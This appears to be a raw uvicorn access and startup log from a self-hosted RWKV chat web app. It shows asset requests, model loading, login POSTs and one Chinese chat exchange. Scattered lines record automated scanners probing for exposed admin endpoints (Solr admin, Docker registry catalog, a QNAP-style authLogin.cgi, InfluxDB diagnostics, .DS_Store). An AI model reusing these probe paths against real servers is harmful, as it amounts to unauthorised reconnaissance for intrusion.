+INFO:     180.101.244.14:45264 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.245.246:46444 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.244.13:17986 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     106.55.245.27:9156 - "GET / HTTP/1.1" 200 OK
+INFO:     175.27.137.229:50878 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:50880 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:50892 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:50882 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:50900 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:50914 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46516 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46518 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46520 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46522 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46534 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46548 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46566 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46564 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     148.153.45.234:49112 - "GET /4ZuY HTTP/1.1" 404 Not Found
+INFO:     148.153.45.234:49128 - "GET /G9hu HTTP/1.1" 404 Not Found
+INFO:     148.153.45.234:49142 - "GET /aab8 HTTP/1.1" 404 Not Found
+INFO:     148.153.45.234:49146 - "GET /jquery-3.3.1.slim.min.js HTTP/1.1" 404 Not Found
+INFO:     148.153.45.234:49162 - "GET /aab9 HTTP/1.1" 404 Not Found
+INFO:     148.153.45.234:49168 - "GET /jquery-3.3.2.slim.min.js HTTP/1.1" 404 Not Found
+INFO:     180.101.245.250:41054 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.213.48:60898 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.61:60458 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.61:60458 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.61:60476 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.146:30646 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.144:46750 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.146:30648 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     206.168.34.37:59794 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.37:44510 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.37:44544 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     206.168.34.37:44552 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     220.196.160.51:36812 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.200.233:35618 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.95:28118 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.95:28118 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.95:28150 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.73:36970 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.83:55448 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.101:23478 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.61:39366 - "GET /aab9 HTTP/1.1" 404 Not Found
+INFO:     110.40.36.200:48536 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.57:41948 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.57:36654 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.57:36666 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.138.57:36670 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     223.113.128.182:50564 - "GET / HTTP/1.1" 200 OK
+INFO:     39.100.112.228:41518 - "GET / HTTP/1.0" 200 OK
+INFO:     39.100.112.228:43990 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.45:27164 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.35.33:56889 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.154:50032 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.154:50032 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.53:55052 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.73:41600 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.154:50072 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.117:49624 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+--- 0.7939739227294922 seconds ---
+torch found: /usr/local/lib/python3.10/dist-packages/torch/lib
+torch set
+Strategy Devices: {'cpu'}
+state cache enabled
+RWKV_JIT_ON 1 RWKV_CUDA_ON 0 RESCALE_LAYER 0
+
+Loading /home/ubuntu/models/RWKV-4-World-0.1B-v1-20230520-ctx4096.pth ...
+Model detected: v4.0
+Strategy: (total 12+1=13 layers)
+* cpu [float32, float32], store 13 layers
+0-cpu-float32-float32 1-cpu-float32-float32 2-cpu-float32-float32 3-cpu-float32-float32 4-cpu-float32-float32 5-cpu-float32-float32 6-cpu-float32-float32 7-cpu-float32-float32 8-cpu-float32-float32 9-cpu-float32-float32 10-cpu-float32-float32 11-cpu-float32-float32 12-cpu-float32-float32 
+emb.weight                        f32      cpu  65536   768 
+blocks.0.ln1.weight               f32      cpu    768       
+blocks.0.ln1.bias                 f32      cpu    768       
+blocks.0.ln2.weight               f32      cpu    768       
+blocks.0.ln2.bias                 f32      cpu    768       
+blocks.0.att.time_decay           f32      cpu    768       
+blocks.0.att.time_first           f32      cpu    768       
+blocks.0.att.time_mix_k           f32      cpu    768       
+blocks.0.att.time_mix_v           f32      cpu    768       
+blocks.0.att.time_mix_r           f32      cpu    768       
+blocks.0.att.key.weight           f32      cpu    768   768 
+blocks.0.att.value.weight         f32      cpu    768   768 
+blocks.0.att.receptance.weight    f32      cpu    768   768 
+blocks.0.att.output.weight        f32      cpu    768   768 
+blocks.0.ffn.time_mix_k           f32      cpu    768       
+blocks.0.ffn.time_mix_r           f32      cpu    768       
+blocks.0.ffn.key.weight           f32      cpu    768  3072 
+blocks.0.ffn.receptance.weight    f32      cpu    768   768 
+blocks.0.ffn.value.weight         f32      cpu   3072   768 
+....................................................................................................................................................................................
+blocks.11.ln1.weight              f32      cpu    768       
+blocks.11.ln1.bias                f32      cpu    768       
+blocks.11.ln2.weight              f32      cpu    768       
+blocks.11.ln2.bias                f32      cpu    768       
+blocks.11.att.time_decay          f32      cpu    768       
+blocks.11.att.time_first          f32      cpu    768       
+blocks.11.att.time_mix_k          f32      cpu    768       
+blocks.11.att.time_mix_v          f32      cpu    768       
+blocks.11.att.time_mix_r          f32      cpu    768       
+blocks.11.att.key.weight          f32      cpu    768   768 
+blocks.11.att.value.weight        f32      cpu    768   768 
+blocks.11.att.receptance.weight   f32      cpu    768   768 
+blocks.11.att.output.weight       f32      cpu    768   768 
+blocks.11.ffn.time_mix_k          f32      cpu    768       
+blocks.11.ffn.time_mix_r          f32      cpu    768       
+blocks.11.ffn.key.weight          f32      cpu    768  3072 
+blocks.11.ffn.receptance.weight   f32      cpu    768   768 
+blocks.11.ffn.value.weight        f32      cpu   3072   768 
+ln_out.weight                     f32      cpu    768       
+ln_out.bias                       f32      cpu    768       
+head.weight                       f32      cpu    768 65536 
+INFO:     127.0.0.1:33648 - "POST /switch-model HTTP/1.1" 200 OK
+INFO:     220.248.226.228:46270 - "GET / HTTP/1.1" 304 Not Modified
+INFO:     220.248.226.228:46270 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:46271 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:46269 - "GET /assets/index.css HTTP/1.1" 304 Not Modified
+INFO:     220.248.226.228:46267 - "GET /assets/uuid.js HTTP/1.1" 304 Not Modified
+INFO:     220.248.226.228:46268 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:46268 - "GET /assets/Login.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:46271 - "GET /assets/Page.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:46270 - "GET /assets/Text.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:46269 - "GET /assets/Divider.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:46267 - "GET /assets/Labeled.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:46268 - "GET /assets/%40microsoft/fetch-event-source.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:46271 - "GET /assets/Checkbox.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:46271 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     220.248.226.228:46263 - "POST /v1/login/password HTTP/1.1" 200 OK
+INFO:     220.248.226.228:46262 - "POST /v1/login/password HTTP/1.1" 200 OK
+INFO:     220.248.226.228:46261 - "POST /v1/login/password HTTP/1.1" 200 OK
+INFO:     220.248.226.228:46260 - "POST /v1/login/password HTTP/1.1" 200 OK
+INFO:     220.248.226.228:14398 - "POST /v1/login/password HTTP/1.1" 200 OK
+INFO:     220.248.226.228:62142 - "POST /v1/login/password HTTP/1.1" 200 OK
+--- 0.7045862674713135 seconds ---
+torch found: /usr/local/lib/python3.10/dist-packages/torch/lib
+torch set
+INFO:     220.248.226.228:62207 - "POST /v1/login/password HTTP/1.1" 200 OK
+INFO:     220.248.226.228:33023 - "POST /v1/login/password HTTP/1.1" 200 OK
+--- 0.7094578742980957 seconds ---
+torch found: /usr/local/lib/python3.10/dist-packages/torch/lib
+torch set
+INFO:     220.248.226.228:34235 - "GET /assets/MarkdownRender.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:34237 - "GET /assets/PresetsButton.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:34239 - "GET /assets/index2.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:34238 - "GET /assets/Chat.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:34236 - "GET /assets/%40primer/octicons-react.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:34234 - "GET /assets/ToolTipButton.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:34236 - "GET /assets/Dropdown.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:34239 - "GET /assets/Slider.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:34234 - "GET /assets/DialogButton.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:34235 - "GET /assets/logo.png HTTP/1.1" 304 Not Modified
+INFO:     220.248.226.228:34235 - "POST /v1/chat/completions HTTP/1.1" 400 Bad Request
+Strategy Devices: {'cpu'}
+state cache enabled
+RWKV_JIT_ON 1 RWKV_CUDA_ON 0 RESCALE_LAYER 0
+
+Loading /home/ubuntu/models/RWKV-4-World-0.1B-v1-20230520-ctx4096.pth ...
+Model detected: v4.0
+Strategy: (total 12+1=13 layers)
+* cpu [float32, float32], store 13 layers
+0-cpu-float32-float32 1-cpu-float32-float32 2-cpu-float32-float32 3-cpu-float32-float32 4-cpu-float32-float32 5-cpu-float32-float32 6-cpu-float32-float32 7-cpu-float32-float32 8-cpu-float32-float32 9-cpu-float32-float32 10-cpu-float32-float32 11-cpu-float32-float32 12-cpu-float32-float32 
+emb.weight                        f32      cpu  65536   768 
+blocks.0.ln1.weight               f32      cpu    768       
+blocks.0.ln1.bias                 f32      cpu    768       
+blocks.0.ln2.weight               f32      cpu    768       
+blocks.0.ln2.bias                 f32      cpu    768       
+blocks.0.att.time_decay           f32      cpu    768       
+blocks.0.att.time_first           f32      cpu    768       
+blocks.0.att.time_mix_k           f32      cpu    768       
+blocks.0.att.time_mix_v           f32      cpu    768       
+blocks.0.att.time_mix_r           f32      cpu    768       
+blocks.0.att.key.weight           f32      cpu    768   768 
+blocks.0.att.value.weight         f32      cpu    768   768 
+blocks.0.att.receptance.weight    f32      cpu    768   768 
+blocks.0.att.output.weight        f32      cpu    768   768 
+blocks.0.ffn.time_mix_k           f32      cpu    768       
+blocks.0.ffn.time_mix_r           f32      cpu    768       
+blocks.0.ffn.key.weight           f32      cpu    768  3072 
+blocks.0.ffn.receptance.weight    f32      cpu    768   768 
+blocks.0.ffn.value.weight         f32      cpu   3072   768 
+....................................................................................................................................................................................
+blocks.11.ln1.weight              f32      cpu    768       
+blocks.11.ln1.bias                f32      cpu    768       
+blocks.11.ln2.weight              f32      cpu    768       
+blocks.11.ln2.bias                f32      cpu    768       
+blocks.11.att.time_decay          f32      cpu    768       
+blocks.11.att.time_first          f32      cpu    768       
+blocks.11.att.time_mix_k          f32      cpu    768       
+blocks.11.att.time_mix_v          f32      cpu    768       
+blocks.11.att.time_mix_r          f32      cpu    768       
+blocks.11.att.key.weight          f32      cpu    768   768 
+blocks.11.att.value.weight        f32      cpu    768   768 
+blocks.11.att.receptance.weight   f32      cpu    768   768 
+blocks.11.att.output.weight       f32      cpu    768   768 
+blocks.11.ffn.time_mix_k          f32      cpu    768       
+blocks.11.ffn.time_mix_r          f32      cpu    768       
+blocks.11.ffn.key.weight          f32      cpu    768  3072 
+blocks.11.ffn.receptance.weight   f32      cpu    768   768 
+blocks.11.ffn.value.weight        f32      cpu   3072   768 
+ln_out.weight                     f32      cpu    768       
+ln_out.bias                       f32      cpu    768       
+head.weight                       f32      cpu    768 65536 
+INFO:     127.0.0.1:53454 - "POST /switch-model HTTP/1.1" 200 OK
+INFO:     220.248.226.228:8127 - "POST /v1/chat/completions HTTP/1.1" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-07-10 15:27:52.356847
+2
+
+user: 你好，我是陆小兮，请问有什么可以帮您的？
+
+user: 你好，我是陆小兮，请问有什么可以帮您的？
+response:
+filtered_response:
+INFO:     220.196.160.45:52960 - "GET / HTTP/1.1" 200 OK
+INFO:     81.71.5.172:14021 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.14:16480 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.244.14:16480 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.105:20526 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.244.15:53060 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.244.12:24170 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.244.12:24172 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.146:39788 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.200.233:59354 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.15:21282 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.244.15:21282 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.14:44982 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     59.83.208.104:37654 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.245.249:22526 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.245.249:22524 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     172.169.5.249:60916 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.117:54148 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.27.58:38922 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.84:46684 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.84:46684 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.117:54544 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.45:24366 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.76:24174 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.53:30614 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     167.94.146.53:48418 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.53:51038 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.53:51082 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.146.53:51098 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     114.132.203.153:25410 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     36.99.136.137:6516 - "GET / HTTP/1.1" 200 OK
+INFO:     36.99.136.128:3594 - "GET / HTTP/1.1" 200 OK
+INFO:     36.99.136.129:5339 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     36.99.136.128:3614 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     36.99.136.129:5340 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     36.99.136.128:3613 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     36.99.136.128:5591 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     125.122.15.228:49428 - "GET / HTTP/1.1" 200 OK
+INFO:     125.122.15.228:49528 - "GET / HTTP/1.1" 200 OK
+INFO:     125.122.15.228:49538 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     125.122.15.228:49542 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     125.122.15.228:49540 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     125.122.15.228:49544 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     125.122.15.228:49716 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     172.232.207.11:32675 - "GET / HTTP/1.0" 200 OK
+INFO:     172.232.194.228:33550 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     172.232.194.100:30668 - "GET /solr/admin/info/system HTTP/1.1" 404 Not Found
+INFO:     172.232.194.28:54292 - "GET / HTTP/1.1" 200 OK
+INFO:     172.232.206.34:57000 - "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 Not Found
+INFO:     52.76.71.100:1375 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     172.232.194.100:30662 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 Not Found
+INFO:     172.232.194.100:30700 - "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 404 Not Found
+INFO:     180.101.245.247:18494 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.75:54970 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.201.50:4655 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.12:38012 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.244.12:38012 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.108:50176 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     59.83.208.107:42828 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     59.83.208.105:43244 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.244.12:38038 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.117:34368 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.108:44890 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.108:44890 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     129.211.167.200:59750 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.245.247:43104 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     59.83.208.104:57996 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.245.247:43102 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.245.248:48430 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     180.101.244.13:54774 - "GET /solr/admin/info/system HTTP/1.1" 404 Not Found
+INFO:     220.196.160.151:22250 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 Not Found
+INFO:     220.196.160.146:51842 - "GET / HTTP/1.1" 200 OK
+INFO:     81.71.5.172:6349 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.117:40750 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.117:40750 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.51:41158 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.83:58574 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.76:48762 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.76:48760 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     185.242.226.42:43462 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.245.253:30830 - "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 404 Not Found
+INFO:     162.142.125.217:49852 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.217:51390 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.217:51426 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     162.142.125.217:51444 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     167.94.145.96:44102 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.96:50568 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.96:50624 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.145.96:50652 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     59.83.208.104:36310 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.202.186:11685 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.107:16050 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.107:16050 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.15:34658 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     59.83.208.103:34652 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     59.83.208.105:40714 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.245.252:40272 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     45.83.65.161:37340 - "GET / HTTP/1.1" 200 OK
+INFO:     45.83.66.238:37354 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     220.196.160.117:36612 - "GET / HTTP/1.1" 200 OK
+INFO:     81.71.5.172:1350 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.76:25370 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.76:25370 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.76:25408 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.53:45262 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.76:25414 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.117:36864 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     59.83.208.105:35938 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.214.104:47935 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.253:48258 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.245.253:48258 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.14:44026 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.244.13:25480 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     59.83.208.106:48934 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     59.83.208.106:48936 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     167.94.138.32:43512 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.32:51020 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.32:51044 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.138.32:51080 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     157.230.0.118:48476 - "GET / HTTP/1.0" 200 OK
+INFO:     51.8.217.57:41668 - "GET / HTTP/1.1" 200 OK
+INFO:     154.212.141.224:12488 - "GET / HTTP/1.1" 200 OK
+INFO:     154.212.141.230:35502 - "GET / HTTP/1.1" 200 OK
+INFO:     154.212.141.230:35530 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     154.212.141.230:35552 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     172.232.203.196:4539 - "GET / HTTP/1.0" 200 OK
+INFO:     172.232.203.12:29476 - "GET /solr/admin/info/system HTTP/1.1" 404 Not Found
+INFO:     172.232.203.14:32854 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 Not Found
+INFO:     172.232.203.16:24654 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     172.232.203.12:29492 - "GET / HTTP/1.1" 200 OK
+INFO:     172.232.203.12:29472 - "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 Not Found
+INFO:     172.232.203.12:29498 - "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 404 Not Found
+INFO:     52.76.71.100:26455 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     59.83.208.103:53054 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 Not Found
+INFO:     180.101.245.247:30096 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.202.193:1065 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.107:38528 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.107:38528 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.108:27682 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.245.249:32410 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.245.248:60368 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.245.246:30834 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.95:37202 - "GET /solr/admin/info/system HTTP/1.1" 404 Not Found
+INFO:     220.196.160.45:26850 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     172.232.206.34:25769 - "GET / HTTP/1.0" 200 OK
+INFO:     172.232.203.4:10358 - "GET /solr/admin/info/system HTTP/1.1" 404 Not Found
+INFO:     172.232.203.4:10364 - "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 404 Not Found
+INFO:     172.232.203.4:51458 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 Not Found
+INFO:     172.232.203.67:59830 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     172.232.203.247:65048 - "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 Not Found
+INFO:     172.232.203.67:30696 - "GET / HTTP/1.1" 200 OK
+INFO:     52.76.71.100:3971 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     87.236.176.188:36485 - "GET / HTTP/1.1" 200 OK
+INFO:     87.236.176.134:38105 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     220.196.160.95:48120 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.202.193:37187 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.84:42002 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.84:42002 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.84:42054 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.96:44942 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.101:58420 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.125:26752 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     52.81.208.114:44176 - "GET / HTTP/1.1" 200 OK
+INFO:     52.81.208.114:44178 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     52.81.208.114:44182 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     52.81.208.114:44186 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     52.81.208.114:44202 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     106.75.166.204:41558 - "GET /.DS_Store HTTP/1.1" 404 Not Found
+INFO:     167.94.138.51:47044 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.51:47058 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.51:52316 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.138.51:52356 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     220.196.160.61:27800 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.245.248:54016 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.3.160:18658 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     106.55.202.193:29410 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.75:40516 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.75:40516 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.65:50234 - "GET /assets/index.css HTTP/1.1" 200 OK
